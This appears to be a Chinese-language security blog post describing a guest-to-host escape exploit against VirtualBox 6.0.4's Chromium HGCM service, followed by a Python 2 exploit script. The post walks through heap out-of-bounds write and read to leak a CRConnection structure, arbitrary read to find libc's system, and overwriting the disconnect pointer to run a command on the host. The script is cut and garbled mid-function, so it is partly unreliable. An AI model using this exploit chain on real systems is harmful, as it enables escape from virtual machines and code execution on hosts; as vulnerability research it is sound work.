参考之前有leak时的思路，当没有leak时，我们仍然有：
  1. 任意地址写
  2. 堆越界写
但是我们没有任何的地址信息，所以接下来的思路就是如何利用一个堆越界写来泄露地址最后达到任意地址读的效果。
我们可以先参考之前的niklasb任意地址读的实现思路。他是通过读写一个CRConnection结构体的pHostBuffer和cbHostBuffer，以及SHCRGL_GUEST_FN_READ来实现任意地址读。我们使用相同的思路，就需要泄露一个CRConnection结构体的地址。而他之前泄露一个CRConnection结构体的位置是通过crUnpackExtendGetUniformLocation中的堆越界来实现的，而我们想要达到同样的效果可以有一种实现思路：
  1. 在我们可以越界写的Buffer后放一个CR_GETUNIFORMLOCATION_EXTEND的Buffer
  2. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分
  3. 通过WRITE_READ_BUFFERED进入crUnpackExtendGetUniformLocation实现越界读
如果在CR_GETUNIFORMLOCATION_EXTEND
Buffer之后恰好可以放一个CRClient或者CRConnection的结构体，就可以泄露关键的结构体了。所以，总体的利用思路如下：
  1. 排布内存，使堆空间分布如下：
  2. 通过之前提到的相同操作，通过堆溢出实现任意地址写与越界写
  3. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分
  4. 通过crUnpackExtendGetUniformLocation越界读获取CRConnection的地址
  5. 通过CRConnection任意地址读获取crVBoxHGCMFree的地址
  6. 通过动态库获取libc中system的地址
  7. 修改disconnect函数指针为system，修改CRConnection头部为payload8. disconnect弹计算器
我在实际实现中多了一个步骤，在泄露完CRConnection地址之后还泄露了一个对应的clientID。（当然这一步也可以省略，在exp中遍历所有的clientID即可）
完整的exp如下(环境：ubuntu 18.04及其apt安装的Virtualbox 6.0.4)：
    #!/usr/bin/env python2
    from __future__ import print_function
    import os, sys
    from array import array
    from struct import pack, unpack
    sys.path.append(os.path.abspath(os.path.dirname(__file__)) + '/lib')
    from chromium import *
    from hgcm import *
    crVBoxHGCMFree_off=0x20890
    vbox_puts_off=0x22f0f0
    libc_puts_off=0x809c0
    libc_system_off=0x4f440
    def make_oob_read(offset):
        return (
            pack(">32
            #self.read(self.pConn ,0x200, canfail= True)
            for i in range(len(client)):
                if client[i]!=self.client3:
                    hgcm_disconnect(client[i])
            crVBoxHGCMFree = self.read64(self.pConn + OFFSET_CONN_FREE,canfail=True)
            print('[*] Leaked crVBoxHGCMFree @ 0x%016x' % crVBoxHGCMFree)
            self.system = self.read64(crVBoxHGCMFree-crVBoxHGCMFree_off+vbox_puts_off,canfail=True)-libc_puts_off+libc_system_off
            print('[*] Leaked system @ 0x%016x' % self.system)
            pay = '/snap/bin/gnome-calculator\x00'
            self.write64(self.pConn+0x128,self.system)
            self.write(self.pConn,pay)
            hgcm_disconnect(self.client3)
            while(1):
                i=i+1
            return
    if __name__ == '__main__':
        p = Pwn()
        p.setup()
        #if raw_input('you want RIP control? [y/n] ').startswith('y'):
        #    p.rip(0xdeadbeef)
**其他相关链接** \-  \- 
* * *